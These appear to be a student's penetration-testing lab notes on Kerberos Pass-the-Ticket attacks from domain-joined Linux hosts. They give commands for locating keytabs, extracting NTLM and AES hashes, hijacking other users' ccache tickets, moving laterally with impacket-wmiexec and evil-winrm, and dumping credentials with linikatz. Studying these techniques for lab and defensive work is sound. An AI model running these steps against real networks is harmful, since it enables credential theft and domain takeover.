- Linux machines CAN be domain-joined (via sssd/winbind), and still use Kerberos the same way Windows does
- Ticket storage differs: Linux uses **ccache files** (usually in `/tmp`) and **keytab files** instead of LSASS memory

---
## Check if a Linux box is domain-joined
```bash
realm list
```
- Shows domain name + which users/groups are allowed to log in
- If `realm` isn't available, check for sssd/winbind running: `ps -ef | grep -i "winbind\|sssd"`

---
## Keytab files
- A keytab = username + encrypted key pairs, lets scripts auth to Kerberos without typing a password
- Found at `/etc/krb5.keytab` (the machine account's own ticket, root-only) or search for `*keytab*`, also check cronjob scripts for `kinit ... -k -t <path>`

```bash
find / -name "*keytab*" -ls 2>/dev/null
klist -k -t carlos.keytab      # see which user the keytab belongs to
kinit carlos@INLANEFREIGHT.HTB -k -t carlos.keytab   # impersonate that user
```

**Extract the hash from a keytab** (to crack it or Pass-the-Hash with it)
```bash
python3 keytabextract.py carlos.keytab

# Example Output
NTLM HASH : a738f92b3c08b424ec2d99589a9cce60  
AES-256 HASH : ...
```

- Crack the NTLM hash with hashcat/john like normal, or use the AES hash to forge a ticket with Rubeus

---
## ccache files (active sessions, in `/tmp`)
```bash
env | grep -i krb5              # shows our own ticket's path (KRB5CCNAME)
ls -la /tmp                     # as root, see every other logged-in user's ccache file
```
- As root, copy someone else's ccache and point the env var at it to impersonate them (no password needed, as long as the ticket hasn't expired)
```bash
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
klist      # confirm it loaded correctly
```
- `klist` without the export first will say "no credentials cache found", that's normal for root (root has no ticket of its own)

---
## Using the ticket with attack tools
```bash
impacket-wmiexec dc01 -k           # -k = use Kerberos ticket from KRB5CCNAME
evil-winrm -i dc01 -r inlanefreight.htb   # needs krb5-user installed + /etc/krb5.conf set up
```
- If attacking from OUR box (not domain-joined), we need name resolution + a route to the DC, usually via a proxy/tunnel (see Pivoting module)

---
## Converting between formats
```bash
impacket-ticketConverter krb5cc_xxx julio.kirbi    # ccache -> kirbi (for use on Windows)
```

---
## Linikatz (dump everything at once, needs root)
```bash
/opt/linikatz.sh
```
- Linux equivalent of Mimikatz, pulls tickets/hashes from sssd, FreeIPA, Samba, etc all in one run

See [[Pass The Ticket (Windows)]] for the Windows side.